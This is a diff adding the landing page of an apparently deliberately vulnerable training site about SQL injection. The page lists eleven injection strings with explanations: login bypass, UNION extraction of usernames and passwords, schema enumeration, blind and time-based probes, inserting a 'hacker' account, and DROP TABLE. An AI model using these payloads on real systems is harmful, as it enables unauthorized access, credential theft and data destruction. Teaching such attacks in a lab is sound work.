@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Vulnerable Site</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=New+Rocker&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="TheVulnerableSite.jpg" alt="The Vulnerable Site Logo">
+        </div>
+        <div class="description-box">
+            <h1 class="title">SQL Injections</h1>
+            <p>Welcome to The Vulnerable Site. This site is designed to help you understand common security flaws in web applications. 
+               On the next page, you'll encounter a login page with a high-level vulnerability that allows for unauthorized access through 
+               SQL Injection.</p>
+            <p>SQL Injection is a technique where attackers exploit vulnerabilities in an application's input fields by injecting malicious SQL code, which is then executed by the backend database. This allows attackers to manipulate the database in unintended ways, such as bypassing authentication, retrieving sensitive data, modifying or deleting records, and even executing administrative commands. By manipulating SQL queries through user inputs, attackers can gain unauthorized access to the application's data and functions, potentially leading to severe security breaches.</p>
+            <p>Notice: This information is for educational purposes ONLY.</p>
+            <div class="links">
+                <a href="SQL.html" class="vulnerable-link">The Vulnerable Page</a>
+                <a href="https://thecyberindex.com" class="cyberindex-link">Visit TheCyberIndex.com</a>
+        </div>
+        <div>
+        <div class="sqli-examples">
+            <h2>SQL Injection Examples</h2>
+            <div class="example-commands">
+                <div class="command-box">
+                    <p>Login Bypass:</p>
+                    <pre>' OR '1'='1';--</pre>
+                    <p>This simple injection bypasses the authentication mechanism by making the condition always true.</p>
+                </div>
+                <div class="command-box">
+                    <p>Retrieve All Usernames:</p>
+                    <pre>' UNION SELECT username, password FROM users;--</pre>
+                    <p>This query retrieves usernames and passwords from the users table.</p>
+                </div>
+                <div class="command-box">
+                    <p>Blind SQL Injection:</p>
+                    <pre>' AND (SELECT COUNT(*) FROM users) > 0;--</pre>
+                    <p>Used to confirm if certain data exists in the database by posing a true/false condition.</p>
+                </div>
+                <div class="command-box">
+                    <p>Extract Database Version:</p>
+                    <pre>' UNION SELECT @@version;--</pre>
+                    <p>This command retrieves the database version running on the server.</p>
+                </div>
+                <div class="command-box">
+                    <p>Retrieve Database Names:</p>
+                    <pre>' UNION SELECT schema_name FROM information_schema.schemata;--</pre>
+                    <p>Fetches the names of all databases on the server.</p>
+                </div>
+                <div class="command-box">
+                    <p>Time-Based Blind SQL Injection:</p>
+                    <pre>' OR IF(1=1, SLEEP(5), 0);--</pre>
+                    <p>Delays the response by 5 seconds if the condition is true, indicating a vulnerability.</p>
+                </div>
+                <div class="command-box">
+                    <p>Extract User Data:</p>
+                    <pre>' UNION SELECT null, username, password FROM users;--</pre>
+                    <p>Extracts usernames and passwords from the users table, with a null to match the number of columns.</p>
+                </div>
+                <div class="command-box">
+                    <p>Check Table Existence:</p>
+                    <pre>' AND (SELECT COUNT(*) FROM users) > 0;--</pre>
+                    <p>Checks if the users table exists by counting rows.</p>
+                </div>
+                <div class="command-box">
+                    <p>Extract Column Names:</p>
+                    <pre>' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users';--</pre>
+                    <p>Retrieves the names of columns in the users table.</p>
+                </div>
+                <div class="command-box">
+                    <p>Double Query Injection:</p>
+                    <pre>'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--</pre>
+                    <p>Adds a new user account by injecting an additional SQL query.</p>
+                </div>
+                <div class="command-box">
+                    <p>Drop Table:</p>
+                    <pre>'; DROP TABLE users;--</pre>
+                    <p>This dangerous command deletes the users table entirely.</p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+</body>
+</html>
